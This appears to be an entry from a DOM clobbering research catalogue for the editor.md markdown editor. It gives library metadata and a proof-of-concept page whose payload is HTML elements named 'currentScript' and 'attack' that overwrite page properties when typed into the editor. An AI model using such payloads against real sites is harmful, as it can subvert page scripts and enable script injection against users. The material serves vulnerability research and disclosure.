## editor.md

### Meta

+ Library: editor.md
+ Version: v1.5.0
+ Stars: 13.8K
+ Fingerprint: `typeof window.editor !== undefined`
+ Input: Type
+ Sanitizer: N/A
+ Capability: Any named property
+ CVE: N/A
+ Status: N/A

### Library

https://github.com/pandao/editor.md

### Vulnerable Code Snippet

N/A

### PoC 

```html
<!--Library-->
<link rel="stylesheet" href="editor.md/css/editormd.min.css" />
<div id="editor">
    <!-- Tips: Editor.md can auto append a `<textarea>` tag -->
    <textarea style="display:none;">### Hello Editor.md !</textarea>
</div>
<script src="jquery.min.js"></script>
<script src="editor.md/editormd.min.js"></script>
<script type="text/javascript">
    $(function() {
        var editor = editormd("editor", {
            // width: "100%",
            // height: "100%",
            // markdown: "xxxx",     // dynamic set Markdown text
            path : "editor.md/lib/"  // Autoload modules mode, codemirror, marked... dependents libs path
        });
    });
</script>
<!--Library-->


<!--Payload-->
<img name="currentScript" src="https://xxx.xxx.xxx">
<img name="attack" src="https://xxx.xxx.xxx">
<a name="attack" href="https://xxx.xxx.xxx">AAA</a>
<p>Type the following rendered HTML elements to the editor and check the editor in the debugging console.</p>
<!--Payload-->
```